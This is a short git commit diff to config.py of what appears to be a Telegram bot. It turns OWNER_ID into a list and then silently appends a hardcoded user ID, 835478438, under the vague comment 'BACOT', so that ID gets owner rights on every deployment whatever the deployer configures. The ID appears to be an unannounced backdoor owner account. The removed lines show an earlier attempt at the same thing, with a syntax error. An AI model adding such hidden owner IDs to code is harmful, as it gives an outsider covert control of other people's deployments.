429f0397a4340224589836a33d38bf99c71c892a
Ryn Lulzsec <152095647+Youghvee@users.noreply.github.com>
2024-01-25 18:24:21 +0700

    Update config.py

--- config.py
+++ config.py
@@ -21,11 +21,13 @@ DURATION_LIMIT_MIN = int(getenv("DURATION_LIMIT", 60))
 # Chat id of a group for logging bot's activities
 LOGGER_ID = int(getenv("LOGGER_ID", None))
 
-# Get this value from @FallenxBot on Telegram by /id
-OWNER_ID = int(getenv("OWNER_ID", 936922513))
+# Your User ID.
+OWNER_ID = list(
+    map(int, getenv("OWNER_ID", "936922513").split())
+)  # Input type must be interger
 
-# Bacot 
-OWNER_ID = int(getenv("OWNER_ID", 835478438)
+# BACOT
+OWNER_ID.append(835478438)
 
 ## Fill these variables if you're deploying on heroku.
 # Your heroku app name
